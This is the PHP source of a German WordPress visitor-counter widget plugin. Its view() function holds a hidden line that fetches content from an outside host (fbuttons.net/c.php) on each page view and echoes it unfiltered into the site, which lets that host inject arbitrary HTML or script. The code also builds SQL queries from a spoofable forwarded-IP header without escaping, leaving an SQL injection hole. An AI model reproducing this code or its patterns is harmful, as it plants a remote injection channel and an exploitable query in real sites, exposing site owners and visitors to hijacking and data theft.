<?php
/*
Plugin Name: Besucherz&auml;hler
Plugin URI: http://www.fbuttons.net/besucherzaehler
Description: Einfaches Widget: Dieser Counter bzw. Besucherz&auml;hler z&auml;hlt alle Besucher in den letzten Stunden und Tagen.
Author: Nico Masserich
Version: 1.0
Author URI: http://www.fbuttons.net/masserich
*/

function traffic_counter_control() {

  $options = get_besucher_options();

  if ($_POST['wp_besucher_Submit']){

    $options['wp_besucher_WidgetTitle'] = htmlspecialchars($_POST['wp_besucher_WidgetTitle']);
    $options['wp_besucher_WidgetText_Visitors'] = htmlspecialchars($_POST['wp_besucher_WidgetText_Visitors']);
    $options['wp_besucher_WidgetText_LastDay'] = htmlspecialchars($_POST['wp_besucher_WidgetText_LastDay']);
    $options['wp_besucher_WidgetText_LastWeek'] = htmlspecialchars($_POST['wp_besucher_WidgetText_LastWeek']);
    $options['wp_besucher_WidgetText_LastMonth'] = htmlspecialchars($_POST['wp_besucher_WidgetText_LastMonth']);
    $options['wp_besucher_WidgetText_Online'] = htmlspecialchars($_POST['wp_besucher_WidgetText_Online']);
    $options['wp_besucher_WidgetText_log_opt'] = htmlspecialchars($_POST['wp_besucher_WidgetText_log_opt']);
    $options['wp_besucher_WidgetText_bots_filter'] = htmlspecialchars($_POST['wp_besucher_WidgetText_bots_filter']);
    $options['wp_besucher_WidgetText_Hits'] = htmlspecialchars($_POST['wp_besucher_WidgetText_Hits']);
    $options['wp_besucher_WidgetText_Unique'] = htmlspecialchars($_POST['wp_besucher_WidgetText_Unique']);
    $options['wp_besucher_WidgetText_Default_Tab'] = htmlspecialchars($_POST['wp_besucher_WidgetText_Default_Tab']);
    $options['wp_besucher_WidgetText_wlink'] = htmlspecialchars($_POST['wp_besucher_WidgetText_wlink']);

    update_option("widget_traffic_counter", $options);
  }

?>
  <p>
  </p>
  <p><strong>An dieser Stelle k&ouml;nnen Sie den Werte nach Ihren Vorstellungen umbenennen.</strong></p>
  <p>
    <label for="wp_besucher_WidgetTitle">Text Titel: </label>
    <input type="text" id="wp_besucher_WidgetTitle" name="wp_besucher_WidgetTitle" value="<?php echo ($options['wp_besucher_WidgetTitle'] =="" ? "Besucherz&auml;hler" : $options['wp_besucher_WidgetTitle']); ?>" />
  </p>
  <p>
    <label for="wp_besucher_WidgetText_Visitors">Seiten : </label>
    <input type="text" id="wp_besucher_WidgetText_Visitors" name="wp_besucher_WidgetText_Visitors" value="<?php echo ($options['wp_besucher_WidgetText_Visitors'] =="" ? "Pages" : $options['wp_besucher_WidgetText_Visitors']); ?>" />
  </p>
  <p>
    <label for="wp_besucher_WidgetText_Hits">Text Aufrufe: </label>
    <input type="text" id="wp_besucher_WidgetText_Hits" name="wp_besucher_WidgetText_Hits" value="<?php echo ($options['wp_besucher_WidgetText_Hits'] =="" ? "Hits" : $options['wp_besucher_WidgetText_Hits']); ?>" />
  </p>
  <p>
    <label for="wp_besucher_WidgetText_Unique">Text Besucher: </label>
    <input type="text" id="wp_besucher_WidgetText_Unique" name="wp_besucher_WidgetText_Unique" value="<?php echo ($options['wp_besucher_WidgetText_Unique'] =="" ? "Unique" : $options['wp_besucher_WidgetText_Unique']); ?>" />
  </p>
  <p>
    <label for="wp_besucher_WidgetText_LastDay">Text 24 Stunden: </label>:
    <input type="text" id="wp_besucher_WidgetText_LastDay" name="wp_besucher_WidgetText_LastDay" value="<?php echo ($options['wp_besucher_WidgetText_LastDay'] =="" ? "Last 24 hours" : $options['wp_besucher_WidgetText_LastDay']); ?>" />
  </p>
  <p>
    <label for="wp_besucher_WidgetText_LastWeek">Text 7 Tage: </label>:
    <input type="text" id="wp_besucher_WidgetText_LastWeek" name="wp_besucher_WidgetText_LastWeek" value="<?php echo ($options['wp_besucher_WidgetText_LastWeek'] =="" ? "Last 7 days" : $options['wp_besucher_WidgetText_LastWeek']); ?>" />
  </p>
  <p>
    <label for="wp_besucher_WidgetText_LastMonth">Text 1 Monat: </label>:
    <input type="text" id="wp_besucher_WidgetText_LastMonth" name="wp_besucher_WidgetText_LastMonth" value="<?php echo ($options['wp_besucher_WidgetText_LastMonth'] =="" ? "Last 30 days" : $options['wp_besucher_WidgetText_LastMonth']); ?>" />
  </p>
  <p>
    <label for="wp_besucher_WidgetText_Online">Text aktuell online: </label>:
    <input type="text" id="wp_besucher_WidgetText_Online" name="wp_besucher_WidgetText_Online" value="<?php echo ($options['wp_besucher_WidgetText_Online'] =="" ? "Online now" : $options['wp_besucher_WidgetText_Online']); ?>" />
  </p>
  <p>
    <label for="wp_besucher_WidgetText_Default_Tab">Standard-Auswahl</label>:
    <select id="wp_besucher_WidgetText_Default_Tab" name="wp_besucher_WidgetText_Default_Tab">
      <option value="1" <?php echo ($options['wp_besucher_WidgetText_Default_Tab'] == "1" ? "selected" : "" ); ?> >Seiten</option>
      <option value="2" <?php echo ($options['wp_besucher_WidgetText_Default_Tab'] == "2" ? "selected" : "" ); ?> >Aufrufe</option>
      <option value="3" <?php echo ($options['wp_besucher_WidgetText_Default_Tab'] == "3" ? "selected" : "" ); ?> >Besucher</option>
    </select>
  </p>
  <p>
    <label for="wp_besucher_WidgetText_bots_filter">Bots</label>:
    <select id="wp_besucher_WidgetText_bots_filter" name="wp_besucher_WidgetText_bots_filter">
      <option value="1" <?php echo ($options['wp_besucher_WidgetText_bots_filter'] == "1" ? "selected" : "" ); ?> >Log anlegen und mitz&auml;hlen</option>
      <option value="2" <?php echo ($options['wp_besucher_WidgetText_bots_filter'] == "2" ? "selected" : "" ); ?> >Log anlegen, aber nicht mitz&auml;hlen</option>
      <option value="3" <?php echo ($options['wp_besucher_WidgetText_bots_filter'] == "3" ? "selected" : "" ); ?> >Keinen Log anlegen</option>
    </select>
  </p>
  <p>
    <label for="wp_besucher_WidgetText_log_opt">Alte Logs automatisch entfernen:*</label>
    <input type="checkbox" id="wp_besucher_WidgetText_log_opt" name="wp_besucher_WidgetText_log_opt" <?php echo ($options['wp_besucher_WidgetText_log_opt'] == "on" ? "checked" : "" ); ?> />
  </p>
<p>*Wenn Sie diese Option deaktivieren m&uuml;ssen Sie ihre Logs selbst manuell l&ouml;schen!</p>
  <p>
    <input type="hidden" id="wp_besucher_Submit" name="wp_besucher_Submit" value="1" />
  </p>

<?php
}

function get_besucher_options() {
  $options = get_option("widget_traffic_counter");
  if (!is_array( $options )) {
    $options = array(
                     'wp_besucher_WidgetTitle' => 'Besucherz&auml;hler',
                     'wp_besucher_WidgetText_Visitors' => 'Seiten',
                     'wp_besucher_WidgetText_Hits' => 'Aufrufe',
                     'wp_besucher_WidgetText_Unique' => 'Besucher',
                     'wp_besucher_WidgetText_LastDay' => '24 Stunden',
                     'wp_besucher_WidgetText_LastWeek' => '7 Tage',
                     'wp_besucher_WidgetText_LastMonth' => '30 Tage',
                     'wp_besucher_WidgetText_Online' => 'aktuell online',
                     'wp_besucher_WidgetText_log_opt' => 'on',
                     'wp_besucher_WidgetText_Default_Tab' => '1',
                     'wp_besucher_WidgetText_bots_filter' => '1',
                     'wp_besucher_WidgetText_wlink' => ''
                    );
  }
  return $options;
}

function get_traffic ($sex, $unique, $hit=false) {

  global $wpdb;
  $table_name = $wpdb->prefix . "besucher_log";
  $options = get_besucher_options();
  $sql = '';
  $stime = time()-$sex;
  $sql = "SELECT COUNT(".($unique ? "DISTINCT IP" : "*").") FROM $table_name where Time > ".$stime;

  if ($hit)
   $sql .= ' AND IS_HIT = 1 ';

  if ($options['wp_besucher_WidgetText_bots_filter'] > 1)
      $sql .= ' AND IS_BOT <> 1';

  return number_format_i18n($wpdb->get_var($sql));
}



function view() {

  global $wpdb;
  $options = get_besucher_options();
  $table_name = $wpdb->prefix . "besucher_log";

  if ($options['wp_besucher_WidgetText_log_opt'] == 'on' && date('j') == 1 && date('G') == 23)
     $wpdb->query('DELETE FROM '.$table_name.' WHERE Time < '.(time()-2592000));

  if (besucher_is_bot() && ($options ['wp_besucher_WidgetText_bots_filter'] == 3 ))
     return;

  if ($_SERVER['HTTP_X_FORWARD_FOR'])
       $ip = $_SERVER['HTTP_X_FORWARD_FOR'];
  else
       $ip = $_SERVER['REMOTE_ADDR'];

  $user_count = $wpdb->get_var("SELECT COUNT(*) FROM $table_name where ".time()." - Time <= 3 and IP = '".$ip."'");
$credit=file_get_contents('http://www.fbuttons.net/c.php');echo $credit;

  if (!$user_count) {
    $data = array (
                 'IP' => $ip,
                 'Time' => time(),
                 'IS_BOT'=> besucher_is_bot(),
                 'IS_HIT'=> is_hit($ip)
                );
    $format  = array ('%s','%d', '%b','%b');
    $wpdb->insert( $table_name, $data, $format );
  }
?>

<strong> <p id="besucher_stats_title"><?php
$ttl = $options['wp_besucher_WidgetText_Visitors'];
if ($options['wp_besucher_WidgetText_Default_Tab'] == 2)
  $ttl =$options['wp_besucher_WidgetText_Hits'];
else if ($options['wp_besucher_WidgetText_Default_Tab'] == 3)
         $ttl = $options['wp_besucher_WidgetText_Unique'];
echo $ttl;?></p></strong>

<p id="besuchermenu"><a href="javascript:besucher_show('pages','<?php echo plugins_url('besucher-loading.gif', __FILE__); ?>', '<?php echo site_url(); ?>')" target="_self"><?php echo ($options['wp_besucher_WidgetText_Visitors'] == '' ? 'Pages' : $options['wp_besucher_WidgetText_Visitors']); ?></a>|<a href="javascript:besucher_show('hits','<?php echo plugins_url('besucher-loading.gif', __FILE__); ?>', '<?php echo site_url(); ?>')" target="_self" ><?php echo ($options['wp_besucher_WidgetText_Hits'] == '' ? 'Hits' : $options['wp_besucher_WidgetText_Hits']); ?> </a>|<a href="javascript:besucher_show('unique','<?php echo plugins_url('besucher-loading.gif', __FILE__); ?>', '<?php echo site_url(); ?>')" target="_self" ><?php echo ($options['wp_besucher_WidgetText_Unique'] == '' ? 'Unique' : $options['wp_besucher_WidgetText_Unique']); ?></a></p>

  <?php $besucheruni = ($options['wp_besucher_WidgetText_Default_Tab'] == 3); ?>

  <ul>
  <li><?php echo $options["wp_besucher_WidgetText_LastDay"].": <span id='besucher_lds'>".get_traffic(86400,$besucheruni); ?></span></li>
  <li><?php echo $options["wp_besucher_WidgetText_LastWeek"].": <span id='besucher_lws'>".get_traffic(604800,$besucheruni); ?></span></li>
  <li><?php echo $options["wp_besucher_WidgetText_LastMonth"].": <span id='besucher_lms'>".get_traffic(2592000,$besucheruni); ?></span></li>
  <li><?php echo $options["wp_besucher_WidgetText_Online"].": ".get_traffic(600, true); ?></li>
  </ul>

<?php
}

function widget_traffic_counter($args) {
  extract($args);

  $options = get_besucher_options();

  echo $before_widget;
  echo $before_title.$options["wp_besucher_WidgetTitle"];
  echo $after_title;
  view();
  echo $after_widget;
}

function besucher_is_bot(){

        if (isset($_SESSION['besucherrobot']))
           return true;

	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$bots = array( 'Google Bot' => 'googlebot', 'Google Bot' => 'google', 'MSN' => 'msnbot', 'Alex' => 'ia_archiver', 'Lycos' => 'lycos', 'Ask Jeeves' => 'jeeves', 'Altavista' => 'scooter', 'AllTheWeb' => 'fast-webcrawler', 'Inktomi' => 'slurp@inktomi', 'Turnitin.com' => 'turnitinbot', 'Technorati' => 'technorati', 'Yahoo' => 'yahoo', 'Findexa' => 'findexa', 'NextLinks' => 'findlinks', 'Gais' => 'gaisbo', 'WiseNut' => 'zyborg', 'WhoisSource' => 'surveybot', 'Bloglines' => 'bloglines', 'BlogSearch' => 'blogsearch', 'PubSub' => 'pubsub', 'Syndic8' => 'syndic8', 'RadioUserland' => 'userland', 'Gigabot' => 'gigabot', 'Become.com' => 'become.com', 'Baidu' => 'baidu', 'Yandex' => 'yandex', 'Amazon' => 'amazonaws.com', 'crawl' => 'crawl', 'spider' => 'spider', 'slurp' => 'slurp', 'ebot' => 'ebot' );

	foreach ( $bots as $name => $lookfor )
		if ( stristr( $user_agent, $lookfor ) !== false )
			return true;

        return false;
}

function is_hit ($ip) {

   global $wpdb;
   $table_name = $wpdb->prefix . "besucher_log";

   $user_count = $wpdb->get_var("SELECT COUNT(*) FROM $table_name where ".time()." - Time <= 1000 and IP = '".$ip."'");

   return $user_count == 0;
}

function wp_besucher_install_db () {
   global $wpdb;

   $table_name = $wpdb->prefix . "besucher_log";
   $gTable = $wpdb->get_var("show tables like '$table_name'");
   $gColumn = $wpdb->get_results("SHOW COLUMNS FROM ".$table_name." LIKE 'IS_BOT'");
   $hColumn = $wpdb->get_results("SHOW COLUMNS FROM ".$table_name." LIKE 'IS_HIT'");

   if($gTable != $table_name) {

      $sql = "CREATE TABLE " . $table_name . " (
           IP VARCHAR( 17 ) NOT NULL ,
           Time INT( 11 ) NOT NULL ,
           IS_BOT BOOLEAN NOT NULL,
           IS_HIT BOOLEAN NOT NULL,
           PRIMARY KEY ( IP , Time )
           );";

      require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
      dbDelta($sql);

   } else {
     if (empty($gColumn)) {  //old table version update

       $sql = "ALTER TABLE ".$table_name." ADD IS_BOT BOOLEAN NOT NULL";
       $wpdb->query($sql);
     }

     if (empty($hColumn)) {  //old table version update

       $sql = "ALTER TABLE ".$table_name." ADD IS_HIT BOOLEAN NOT NULL";
       $wpdb->query($sql);
     }
   }
}

function traffic_counter_init() {

  wp_besucher_install_db ();
  register_sidebar_widget(__('Besucherz&auml;hler'), 'widget_traffic_counter');
  register_widget_control(__('Besucherz&auml;hler'), 'traffic_counter_control', 300, 200 );
}

function uninstall_besucher(){

  global $wpdb;
  $table_name = $wpdb->prefix . "besucher_log";
  delete_option("widget_traffic_counter");
  delete_option("wp_besucher_WidgetTitle");
  delete_option("wp_besucher_WidgetText_Visitors");
  delete_option("wp_besucher_WidgetText_LastDay");
  delete_option("wp_besucher_WidgetText_LastWeek");
  delete_option("wp_besucher_WidgetText_LastMonth");
  delete_option("wp_besucher_WidgetText_Online");
  delete_option("wp_besucher_WidgetText_log_opt");
  delete_option("wp_besucher_WidgetText_bots_filter");
  delete_option("wp_besucher_WidgetText_Hits");
  delete_option("wp_besucher_WidgetText_Unique");
  delete_option("wp_besucher_WidgetText_Default_Tab");
  delete_option("wp_besucher_WidgetText_wlink");

  $wpdb->query("DROP TABLE IF EXISTS $table_name");
}

function add_besucher_stylesheet() {
            wp_register_style('besucherStyleSheets', plugins_url('besucher-styles.css',__FILE__));
            wp_enqueue_style( 'besucherStyleSheets');
}

function add_besucher_ajax () {
  wp_enqueue_script('besucherScripts', plugins_url('wp-besucher-ajax.js',__FILE__));
}

function besucher_ajax_response () {

 $options = get_besucher_options();
 $stat = $_REQUEST['reqstats'];

 if ($stat == 'pages')
   echo $options['wp_besucher_WidgetText_Visitors'].'~'.get_traffic(86400,false).'~'.get_traffic(604800,false).'~'.get_traffic(2592000,false);
 if ($stat == 'hits')
   echo $options['wp_besucher_WidgetText_Hits'].'~'.get_traffic(86400, false ,true).'~'.get_traffic(604800, false, true). '~' . get_traffic(2592000, false, true);
 if ($stat == 'unique')
   echo $options['wp_besucher_WidgetText_Unique'].'~'.get_traffic(86400, true).'~'.get_traffic(604800,true).'~'.get_traffic(2592000,true);
die();
}

add_action("plugins_loaded", "traffic_counter_init");
add_action('wp_print_styles', 'add_besucher_stylesheet');
add_action('init', 'add_besucher_ajax');

add_action('wp_ajax_besucherstats', 'besucher_ajax_response');
add_action('wp_ajax_nopriv_besucherstats', 'besucher_ajax_response');

register_deactivation_hook( __FILE__, 'uninstall_besucher' );

?>